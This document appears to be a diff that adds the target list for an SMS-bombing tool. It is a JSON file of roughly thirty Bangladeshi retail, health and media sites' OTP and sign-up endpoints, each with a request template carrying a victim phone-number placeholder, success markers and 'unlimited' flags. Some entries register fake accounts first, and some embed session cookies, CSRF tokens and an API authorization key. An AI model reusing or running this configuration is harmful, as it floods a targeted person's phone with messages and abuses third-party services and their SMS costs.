@@ -1,0 +1,240 @@
+[{
+    "unlimited": true,
+    "url": "https://floralimited.com/account/checkuser",
+    "method": "post",
+    "data": "Username=%2B880{MOBILE_NO}",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "identifier": "IsActive"
+}, {
+    "unlimited": true,
+    "url": "https://api.nittabazar.com/api/sendOtp",
+    "method": "post",
+    "data": "{\"customers_telephone\": \"0{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "\"success\":\"1\""
+}, {
+    "unlimited": true,
+    "url": "https://www.poshorabd.com/send-otp-for-new-user?phone_num=0{MOBILE_NO}",
+    "method": "get",
+    "data": "",
+    "headers": {},
+    "identifier": "\"flag\":\"send\""
+}, {
+    "unlimited": true,
+    "url": "https://api.ostad.app/api/v2/user/",
+    "method": "post",
+    "data": "{\"phone\":\"880{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "\"status\":\"success\""
+}, {
+    "unlimited": true,
+    "url": "https://api.fashionfield.com.bd/api/customer/login",
+    "method": "post",
+    "data": "{\"phone\":\"0{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "\"message\":\"success\""
+}, {
+    "unlimited": true,
+    "url": "https://shijang.com/c-sign-up",
+    "method": "post",
+    "data": "c_name=Hshsbdb&c_contact_number=0{MOBILE_NO}&c_account_type=Personal&c_business_name=",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "identifier": "\"type\":\"alert-success\""
+}, {
+    "unlimited": true,
+    "url": "https://admin.beautybooth.com.bd/api/v2/auth/signup",
+    "method": "post",
+    "data": "{\"phone\":\"0{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "Please verify"
+}, {
+    "unlimited": true,
+    "url": "https://api.miah.shop/api/otp",
+    "method": "post",
+    "data": "{\"phone\":\"0{MOBILE_NO}\",\"email\":\"tywuqbcuv\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "\"status\":true"
+}, {
+    "unlimited": false,
+    "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{MOBILE_NO}&operator=bd-otp",
+    "method": "get",
+    "data": "",
+    "headers": {"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.48 Mobile Safari/537.36"},
+    "identifier": "SUCCESS"
+}, {
+    "unlimited": false,
+    "url": "https://api.bacbontutors.com/V2/student/pre-register",
+    "method": "post",
+    "data": "{\"name\":\"Jdjdbdb\",\"mobile_no\":\"0{MOBILE_NO}\",\"email\":\"ndndbfbdb@gmail.com\",\"referred_code\":null,\"app_signature\":\"BacBon Tutors\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "OTP has been sent"
+}, {
+    "unlimited": true,
+    "url": "https://healthway.com.bd/account/api/send/otp/",
+    "method": "post",
+    "data": "{\"username\":\"0{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": ""
+}, {
+    "unlimited": false,
+    "url": "https://web-api.binge.buzz/api/v3/otp/send/login",
+    "method": "post",
+    "data": "{\"phone\":\"+880{MOBILE_NO}\"}",
+    "headers": {
+        "Device-Type": "web",
+        "Content-Type": "application/json"
+    },
+    "identifier": "OTP sent successfully"
+}, {
+    "unlimited": true,
+    "url": "https://www.chinaexpress.com.bd/admin/api/v1/check-exists-customer",
+    "method": "post",
+    "data": "{\"phone\":\"+880{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "OTP send to your phone"
+}, {
+    "unlimited": false,
+    "url": "https://api.bongo-solutions.com/auth/api/login/send-otp",
+    "method": "post",
+    "data": "{\"operator\":\"all\",\"msisdn\":\"880{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "success"
+}, {
+    "unlimited": false,
+    "url": "https://fundesh.com.bd/api/auth/resendOTP",
+    "method": "post",
+    "data": "{\"msisdn\":\"{MOBILE_NO}\"}",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "identifier": "OTP_RESEND_SUCCESS",
+    "preback": {
+        "url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
+        "method": "post",
+        "data": "{\"msisdn\":\"{MOBILE_NO}\"}",
+        "headers": {
+            "Content-Type": "application/json"
+        },
+        "identifier": "OTP_SENT_SUCCESS"
+    }
+}, {
+    "unlimited": false,
+    "url": "https://api.osudpotro.com/api/v1/users/send_otp",
+    "method": "post",
+    "data": "{\"mobile\":\"+88-0{MOBILE_NO}\", \"deviceToken\":\"app\", \"os\":\"app\"}",
+    "headers": {"Content-Type":"application/json"},
+    "identifier": "OTP has been sent"
+}, {
+    "unlimited": true,
+    "url": "https://api.munchies.com.bd/parse/functions/generateOtp",
+    "method": "post",
+    "data": "{\"phone\":\"0{MOBILE_NO}\"}",
+    "headers": {"Content-Type":"application/json", "x-parse-application-id": "food"},
+    "identifier": "Success"
+}, {
+    "unlimited": true,
+    "url": "https://prodapi.swap.com.bd/api/v1/send-otp/login",
+    "method": "post",
+    "data": "{\"mobile_number\":\"0{MOBILE_NO}\"}",
+    "headers": {"Content-Type":"application/json", "x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"},
+    "identifier": "\"success\":true"
+}, {
+    "unlimited": false,
+    "url": "https://api.eat-z.com/auth/customer/signin",
+    "method": "post",
+    "data": "{\"username\":\"+880{MOBILE_NO}\"}",
+    "headers": {"Content-Type":"application/json"},
+    "identifier": "session"
+}, {
+    "unlimited": true,
+    "url": "https://sonamoni.com/index.php?route=extension%2Fmodule%2Fxsmsprohelper%2Fcommonlogin%2Fexists",
+    "method": "post",
+    "data": "xsmspro_page=cleanlogin&telephone=0{MOBILE_NO}",
+    "headers": {"Content-Type":"application/x-www-form-urlencoded"},
+    "identifier": "We have sent"
+}, {
+    "unlimited": true,
+    "url": "https://pulseservicesbd.com/authentication/mobile_verification_otp/1",
+    "method": "post",
+    "data": "csrf_token=088e86e9d74c169ede12e8fcc525e3f1&user_mobile={MOBILE_NO}&user_country=1",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "csrf_token=088e86e9d74c169ede12e8fcc525e3f1; ci_session=mun71kcgi9s9j2p881a3gibcnmj93gt1; language=english"},
+    "identifier": ""
+}, {
+    "unlimited": true,
+    "url": "https://api.arogga.com/v1/auth/sms/send",
+    "method": "post",
+    "data": "mobile=%2B880{MOBILE_NO}",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"},
+    "identifier": "SMS sent"
+}, {
+    "unlimited": true,
+    "url": "https://gateway.drobboo.com/core/api/v1/customer/sign-up",
+    "method": "post",
+    "data": "{\"firstName\":\"Bdbdbdb\",\"lastName\":\"Djjdbdbdb\",\"countryCode\":\"+880\",\"password\":\"Abc12345\",\"phoneNumber\":\"{MOBILE_NO}\"}",
+    "headers": {"Content-Type":"application/json"},
+    "identifier": "Success"
+}, {
+    "unlimited": false,
+    "url": "https://farmhouse.com.bd/wp-admin/admin-ajax.php",
+    "method": "post",
+    "data": "xoo-ml-reg-phone-cc=%2B88&xoo-ml-reg-phone=0{MOBILE_NO}&xoo-ml-form-token=7260&woocommerce-register-nonce=3daf325eb2&_wp_http_referer=%2Fmy-account%2F&action=xoo_ml_request_otp",
+    "headers": {"Content-Type":"application/x-www-form-urlencoded"},
+    "identifier": "OTP sent"
+}, {
+    "unlimited": true,
+    "url": "https://api.shopoth.com/shop/api/v1/otps/send",
+    "method": "post",
+    "data": "{\"phone\":\"0{MOBILE_NO}\"}",
+    "headers": {"Content-Type":"application/json"},
+    "identifier": "Successfully sent OTP",
+    "preback":{
+        "url":"https://api.shopoth.com/shop/api/v1/users/signup",
+        "method":"post",
+        "data":"{\"full_name\":\"Hshsbdb\",\"phone\":\"0{MOBILE_NO}\",\"email\":\"{RANDOM}@gmail.com\",\"subscribe\":false,\"gender\":\"1\",\"date_of_birth\":\"1988-08-16\",\"password\":\"shshvdbdhdj1\"}",
+        "headers":{"Content-Type":"application/json"},
+        "identifier":"User registration successful"
+    }
+}, {
+    "unlimited": true,
+    "url": "https://doctorola.com/login_sending_code",
+    "method": "post",
+    "data": "mobile=0{MOBILE_NO}",
+    "headers": {"Content-Type":"application/x-www-form-urlencoded"},
+    "identifier": "OTP code send to your mobile"
+}, {
+    "unlimited": false,
+    "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
+    "method": "post",
+    "data": "{\"username\":\"+880{MOBILE_NO}\"}",
+    "headers": {"Content-Type":"application/json", "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.48 Mobile Safari/537.36"},
+    "identifier": "success"
+}, {
+    "unlimited": true,
+    "url": "https://api.meenaclick.com/api/front/sms/send/pin",
+    "method": "post",
+    "data": "{\"cell_phone\":\"880{MOBILE_NO}\",\"type\":\"{RANDOM}\"}",
+    "headers": {"Content-Type":"application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"},
+    "identifier": "true"
+}]
